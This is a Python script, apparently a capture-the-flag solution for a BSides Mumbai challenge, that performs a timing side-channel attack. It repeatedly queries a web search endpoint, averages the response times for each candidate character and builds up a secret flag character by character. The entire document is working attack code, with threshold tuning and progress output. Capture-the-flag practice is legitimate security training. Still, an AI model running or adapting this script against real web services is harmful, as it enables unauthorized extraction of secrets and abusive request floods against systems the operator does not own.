import requests, time, string

url = "https://a1da2a97.bsidesmumbai.in/search"
charset = string.ascii_letters + string.digits + "{}_"
threshold = 0.17       # Higher than your last run
attempts_per_char = 7  # Increase for better timing stability

known = "C"

def avg_response_time(payload):
    total = 0
    for _ in range(attempts_per_char):
        start = time.time()
        try:
            requests.get(url, params={"q": payload}, timeout=3)
        except requests.exceptions.RequestException:
            pass
        total += time.time() - start
    return total / attempts_per_char

while True:
    found = False
    candidates = []

    for c in charset:
        payload = known + c
        avg_time = avg_response_time(payload)
        candidates.append((payload, avg_time))
        print(f"Trying '{payload}' → Avg time: {avg_time:.3f}s")

        # Early match if it's clearly above threshold
        if avg_time > threshold:
            known += c
            print(f"\n✔️  Found next character: '{c}' → Current known: '{known}'\n")
            found = True
            break

    if not found:
        print("\n⚠️ No character crossed the threshold. Showing top 5 slowest responses:")
        candidates.sort(key=lambda x: x[1], reverse=True)
        for cand, time_taken in candidates[:5]:
            print(f"{cand} → {time_taken:.3f}s")

        print("\n❌ No strong match found. Stopping.")
        break

print(f"\n✅ Secret discovered: {known}")
